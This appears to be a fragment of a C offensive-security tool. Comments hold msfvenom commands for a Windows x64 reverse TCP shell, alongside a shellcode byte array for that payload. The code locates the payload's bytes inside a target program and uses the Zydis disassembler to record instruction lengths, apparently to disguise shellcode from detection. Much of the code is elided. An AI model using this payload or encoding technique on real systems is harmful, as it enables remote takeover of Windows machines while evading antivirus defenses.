...
//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=9000
const unsigned char Payload[] = {
...
//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.91 LPORT=9000
//const unsigned char Payload[] = {
//0xfc,0x48,0x83,0xe4,0xf0,0xe8,
//0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
//0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
...
//0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
//0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x23,0x28,
//0xc0,0xa8,0x64,0x5c,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
//0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
//0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
//0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
//0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
...
int main(int argc, char* argv[]) {
    ...
    printf("[i] Size of msfvenom calc payload is: %d bytes\n\n", sizeof(Payload));
    unsigned int Position[sizeof(Payload)];

    //iterate through the bytes of the target program and compare them to the byte we want in the shellcode
    ...
    //Zydis stuff to determine number of instructions
    ZydisDisassembledInstruction instruction;
    ZyanUSize offset = 0;

    count = 0;

    printf("const unsigned int bytesPerLine[] = {\n");
    while (ZYAN_SUCCESS(ZydisDisassembleIntel(ZYDIS_MACHINE_MODE_LONG_64, NULL, Payload + offset, sizeof(Payload) - offset, &instruction))) {
        //while (ZYAN_SUCCESS(ZydisDisassembleIntel(ZYDIS_MACHINE_MODE_LONG_COMPAT_32, NULL, Payload + offset, sizeof(Payload) - offset, &instruction))) {
        ...
        //print the number of bytes in the instruction
        printf("%d, ", instruction.info.length);
